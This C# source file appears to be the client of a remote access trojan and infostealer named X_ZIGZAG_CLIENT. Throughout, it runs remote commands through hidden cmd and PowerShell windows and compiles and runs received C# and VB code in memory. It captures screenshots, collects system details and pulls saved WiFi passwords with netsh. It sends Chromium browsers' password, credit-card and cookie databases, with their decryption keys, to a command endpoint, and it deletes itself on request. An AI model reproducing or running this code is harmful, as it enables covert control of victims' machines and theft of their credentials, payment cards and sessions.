using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System;
using System.Security.Principal;
using System.Management;
using System.Collections.Generic;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Reflection;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using Microsoft.VisualBasic;

namespace X_ZIGZAG_CLIENT
{
    internal class Actions
    {

        public static string ExecuteCommand(string command, bool usePowerShell = false)
        {
            ProcessStartInfo psi;
            if (usePowerShell)
            {
                psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command \"{command}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
            }
            else
            {
                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
            }

            using (Process process = new Process())
            {
                process.StartInfo = psi;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }
        public static void CaptureScreens(string uuid,string endpoint)
        {
            var screens = Screen.AllScreens;

            for (int i = 0; i < screens.Length; i++)
            {
                var screen = screens[i];
                var bounds = screen.Bounds;
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                    }
                    try
                    {
                        using (var stream = new MemoryStream())
                        {
                            var encoder = ImageCodecInfo.GetImageDecoders()[1]; // JPEG encoder
                            var encoderParams = new EncoderParameters(1);
                            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L); // Quality level (0-100)
                            bitmap.Save(stream, encoder, encoderParams);
                            byte[] imageBytes = stream.ToArray();
                            SendImageWithRetry(endpoint + "Response/Image/" + uuid + "/" + i, imageBytes ,10);

                        }
                    }
                    catch (Exception)
                    {

                    }
                }
            }
        }
        public static void UpdateDataWithRetry(int maxRetries,string uuid,long instructionId, string EndPoint)
        {
            Task.Run(async () =>
            {
                TimeSpan delay = TimeSpan.FromSeconds(10); // Initial delay for retry

                bool success = false;
                int retryCount = 0;

                while (!success && retryCount < maxRetries)
                {
                    HttpClient httpClient = new HttpClient();

                    try
                    {
                        var content = new StringContent($"{{\"id\":\"{uuid}\",\"Name\":\"{Actions.GetUsername().Replace("\\", "-")}\",\"Version\":\"{Actions.GetWindowsVersion()}\",\"SystemSpecs\":\"{Actions.GetSystemInfo().Replace("\n", "\\n").Replace("\r", "\\r")}\",\"ipAddress\":\"asd\"}}", Encoding.UTF8, "application/json");

                        var response = await httpClient.PostAsync(EndPoint + "Client/Update/"+instructionId, content);

                        if (response.IsSuccessStatusCode)
                        {
                            break;
                        }
                    }
                    catch (Exception)
                    {

                        retryCount++;
                        await Task.Delay(delay);
                        delay = TimeSpan.FromSeconds(Math.Pow(2, retryCount));
                    }
                }

            });
        }
        public static string ExecuteCsharpCode(string code)
        {
            var codeProvider = new CSharpCodeProvider();

            var compilerParams = new CompilerParameters
            {
                GenerateInMemory = true, // Compile in memory
                GenerateExecutable = false,
                TreatWarningsAsErrors = false
            };

            compilerParams.ReferencedAssemblies.Add("System.dll");

            CompilerResults results = codeProvider.CompileAssemblyFromSource(compilerParams, code);

            if (results.Errors.HasErrors)
            {
                StringWriter errorWriter = new StringWriter();
                foreach (CompilerError error in results.Errors)
                {
                    errorWriter.WriteLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
                }
                return errorWriter.ToString();
            }
            else
            {
                Assembly assembly = results.CompiledAssembly;

                Type type = assembly.GetType("Script");
                MethodInfo method = type?.GetMethod("Execute");

                if (method == null)
                {
                    return "No 'Execute' method found in the script.";
                }

                using (StringWriter consoleOutput = new StringWriter())
                {
                    TextWriter originalOutput = Console.Out;
                    Console.SetOut(consoleOutput);

                    try
                    {
                        object obj = Activator.CreateInstance(type);
                        method.Invoke(obj, null);
                    }
                    catch (Exception ex)
                    {
                        return $"Error during execution: {ex.Message}";
                    }
                    finally
                    {
                        Console.SetOut(originalOutput);
                    }
                    return consoleOutput.ToString();
                }
            }
        }
        public static string ExecuteVbCode(string code)
        {
            var codeProvider = new VBCodeProvider();

            var compilerParams = new CompilerParameters
            {
                GenerateInMemory = true,  // Compile in memory
                GenerateExecutable = false,
                TreatWarningsAsErrors = false
            };

            compilerParams.ReferencedAssemblies.Add("System.dll");

            CompilerResults results = codeProvider.CompileAssemblyFromSource(compilerParams, code);

            if (results.Errors.HasErrors)
            {
                StringWriter errorWriter = new StringWriter();
                foreach (CompilerError error in results.Errors)
                {
                    errorWriter.WriteLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
                }
                return errorWriter.ToString();
            }
            else
            {
                Assembly assembly = results.CompiledAssembly;

                Type type = assembly.GetType("Script");
                MethodInfo method = type?.GetMethod("Execute");

                if (method == null)
                {
                    return "No 'Execute' method found in the script.";
                }

                using (StringWriter consoleOutput = new StringWriter())
                {
                    TextWriter originalOutput = Console.Out;
                    Console.SetOut(consoleOutput);

                    try
                    {
                        object obj = Activator.CreateInstance(type);
                        method.Invoke(obj, null);
                    }
                    catch (Exception ex)
                    {
                        return $"Error during execution: {ex.Message}";
                    }
                    finally
                    {
                        Console.SetOut(originalOutput);
                    }
                    return consoleOutput.ToString();
                }
            }
        }
        public static void SendImageWithRetry(string endpointUrl, byte[] imageBytes,int maxRetries)
        {
            Task.Run(async () =>
            {
                TimeSpan delay = TimeSpan.FromSeconds(10); // Initial delay for retry

                bool success = false;
                int retryCount = 0;

                while (!success && retryCount < maxRetries)
                {
                    HttpClient httpClient = new HttpClient();
                    try
                    {
                        using (var content = new ByteArrayContent(imageBytes))
                        {

                            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                            var response = await httpClient.PostAsync(endpointUrl, content);
                            response.EnsureSuccessStatusCode();
                            success = true;
                        }
                    }
                    catch (Exception)
                    {

                        retryCount++;
                        await Task.Delay(delay);
                        delay = TimeSpan.FromSeconds(Math.Pow(2, retryCount)); 
                    }
                }

            });
        }
        public static void GetBrowsersPasswords(string endpoint,long instructionId,string uuid)
        {
            foreach (string browser in BrowserData.chromiumBrowsers)
            {
                string secretKeyPath ,DataPath;
                if(browser.Contains("Opera Stable"))
                {
                    secretKeyPath = BrowserData.default_appdata + browser + @"\Local State";
                    DataPath = BrowserData.default_appdata + browser + @"\Default\Login Data";
                }else if(browser.Contains("Opera GX Stable"))
                {
                    secretKeyPath = BrowserData.default_appdata + browser + @"\Local State";
                    DataPath = BrowserData.default_appdata + browser + @"\Login Data";
                }
                else
                {
                    secretKeyPath = BrowserData.local_appdata + browser + @"\User Data\Local State";
                    DataPath = BrowserData.local_appdata + browser + @"\User Data\Default\Login Data";
                }
                byte[] readSecretKey = BrowserData.GetChromiumBasedSecretKey(secretKeyPath);

                if (readSecretKey != null && File.Exists(DataPath))
                {
                    // Send The File And The Secret Key to an EndPoint
                    Task.Run(()=>BrowserData.SendPasswordsDBWithRetry(endpoint + "Response/Browser/Password/" + uuid + "/" + instructionId, browser, readSecretKey, DataPath, 10));
                }
            }
        }
        public static void GetBrowsersCreditCards(string endpoint, long instructionId, string uuid)
        {
            foreach (string browser in BrowserData.chromiumBrowsers)
            {
                string secretKeyPath, DataPath;
                if (browser.Contains("Opera Stable"))
                {
                    secretKeyPath = BrowserData.default_appdata + browser + @"\Local State";
                    DataPath = BrowserData.default_appdata + browser + @"\Default\Web Data";
                }
                else if (browser.Contains("Opera GX Stable"))
                {
                    secretKeyPath = BrowserData.default_appdata + browser + @"\Local State";
                    DataPath = BrowserData.default_appdata + browser + @"\Web Data";
                }
                else
                {
                    secretKeyPath = BrowserData.local_appdata + browser + @"\User Data\Local State";
                    DataPath = BrowserData.local_appdata + browser + @"\User Data\Default\Web Data";
                }
                byte[] readSecretKey = BrowserData.GetChromiumBasedSecretKey(secretKeyPath);

                if (readSecretKey != null && File.Exists(DataPath))
                {
                    // Send The File And The Secret Key to an EndPoint
                    Task.Run(() => BrowserData.SendCreditCardDBWithRetry(endpoint + "Response/Browser/CreditCard/" + uuid + "/" + instructionId, browser, readSecretKey, DataPath, 10));
                }
            }
        }
        public static void GetBrowsersCookies(string endpoint, long instructionId, string uuid)
        {
            foreach (string browser in BrowserData.chromiumBrowsers)
            {
                string secretKeyPath, DataPath;
                if (browser.Contains("Opera Stable"))
                {
                    secretKeyPath = BrowserData.default_appdata + browser + @"\Local State";
                    DataPath = BrowserData.default_appdata + browser + @"\Default\Network\Cookies";
                }
                else if (browser.Contains("Opera GX Stable"))
                {
                    secretKeyPath = BrowserData.default_appdata + browser + @"\Local State";
                    DataPath = BrowserData.default_appdata + browser + @"\Network\Cookies";
                }
                else
                {
                    secretKeyPath = BrowserData.local_appdata + browser + @"\User Data\Local State";
                    DataPath = BrowserData.local_appdata + browser + @"\User Data\Default\Network\Cookies";
                }
                byte[] readSecretKey = BrowserData.GetChromiumBasedSecretKey(secretKeyPath);

                if (readSecretKey != null && File.Exists(DataPath))
                {
                    // Send The File And The Secret Key to an EndPoint
                    Task.Run(() => BrowserData.SendCookiesDBWithRetry(endpoint + "Response/Browser/Cookies/" + uuid + "/" + instructionId, browser, readSecretKey, DataPath, 10));
                }
            }
        }
        public static void SelfDestruct()
        {
            string exeFilePath = Assembly.GetExecutingAssembly().Location;
            string command = $"/C timeout 5 && del \"{exeFilePath}\"";
            ProcessStartInfo info = new ProcessStartInfo("cmd.exe", command)
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(info);
            Environment.Exit(0);
        }
        public static string GetUsername()
        {
            return WindowsIdentity.GetCurrent().Name;
        }
        public static string GetWindowsVersion()
        {

                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
                    {
                    string info = "";
                        foreach (var obj in searcher.Get())
                            {
                                info += $"{obj["Caption"]} {obj["BuildNumber"]} {obj["OSArchitecture"]}";
                            }
                        return info;
                    }

                }
                catch (Exception)
                {
                }
                return "";
            
        }
        public static string GetSystemInfo()
        {
            StringBuilder sb = new StringBuilder();

            // CPU Information
            string cpuName = GetWMIValue("Win32_Processor", "Name").Replace("  "," ");
            while (cpuName.Contains("  "))
            {
                cpuName = cpuName.Replace("  ", " ");
            }
            int cpuCores = int.Parse(GetWMIValue("Win32_Processor", "NumberOfCores"));
            int cpuThreads = int.Parse(GetWMIValue("Win32_Processor", "NumberOfLogicalProcessors"));
            sb.AppendLine($"{cpuName} - {cpuCores}/{cpuThreads}");

            // RAM Information
            var ramInfo = GetRAMInfo();
            foreach (var ram in ramInfo)
            {
                sb.AppendLine(string.Format("{0} - {1} GB", ram.Item1, ram.Item2));
            }

            // GPU Information
            string gpuName = GetWMIValue("Win32_VideoController", "Name");
            sb.AppendLine($"{gpuName}");

            // Disk Information
            Dictionary<string, string> disks = new Dictionary<string, string>();
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
            using (var collection = searcher.Get())
            {
                foreach (var disk in collection)
                {
                    string model = disk["Model"].ToString();
                    long sizeBytes = long.Parse(disk["Size"].ToString());
                    double sizeGB = Math.Round((double)sizeBytes / (1024 * 1024 * 1024), 2);
                    disks.Add(model, $"{sizeGB} GB");
                }
            }

            int diskCount = 1;
            foreach (var disk in disks)
            {
                sb.AppendLine($"DISK {diskCount} {disk.Key} - {disk.Value}");
                diskCount++;
            }

            return sb.ToString();
        }
        static string GetWMIValue(string className, string propertyName)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {propertyName} FROM {className}"))
                using (var collection = searcher.Get())
                {
                    foreach (var obj in collection)
                    {
                        return obj[propertyName]?.ToString() ?? "N/A";
                    }
                }
            }
            catch
            {
                return "N/A";
            }
            return "N/A";
        }

        static List<Tuple<string, double>> GetRAMInfo()
        {
            var ramList = new List<Tuple<string, double>>();

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Manufacturer, PartNumber, Capacity FROM Win32_PhysicalMemory"))
                using (var collection = searcher.Get())
                {
                    foreach (var ram in collection)
                    {
                        string manufacturer = ram["Manufacturer"].ToString().Trim();
                        string partNumber = ram["PartNumber"].ToString().Trim();
                        long capacityBytes = Convert.ToInt64(ram["Capacity"]);
                        double capacityGB = Math.Round((double)capacityBytes / (1024 * 1024 * 1024), 2);

                        string name = string.Format("{0} {1}", manufacturer, partNumber).Trim();
                        if (string.IsNullOrWhiteSpace(name))
                        {
                            name = "Unknown RAM";
                        }

                        ramList.Add(new Tuple<string, double>(name, capacityGB));
                    }
                }
            }
            catch
            {
            }

            return ramList;
        }

        public static string ExtractWiFiPasswords()
        {
            StringBuilder result = new StringBuilder();

            try
            {
                // Get the list of WiFi profiles
                Process process = new Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "wlan show profiles";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Extract profile names
                string[] lines = output.Split('\n');
                string pattern = @"All User Profile\s+:\s(.*)";

                foreach (string line in lines)
                {
                    Match match = Regex.Match(line, pattern);
                    if (match.Success)
                    {
                        string profileName = match.Groups[1].Value.Trim();
                        string password = GetPasswordForProfile(profileName);
                        result.AppendLine($"{profileName} : {password}");
                    }
                }
            }
            catch (Exception ex)
            {
                result.AppendLine($"An error occurred: {ex.Message}");
            }

            return result.ToString();
        }

        private static string GetPasswordForProfile(string profileName)
        {
            Process process = new Process();
            process.StartInfo.FileName = "netsh";
            process.StartInfo.Arguments = $"wlan show profile name=\"{profileName}\" key=clear";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string passwordPattern = @"Key Content\s+:\s(.*)";
            Match passwordMatch = Regex.Match(output, passwordPattern);

            if (passwordMatch.Success)
            {
                return passwordMatch.Groups[1].Value.Trim();
            }
            else
            {
                return "Not found";
            }
        }


    }
}
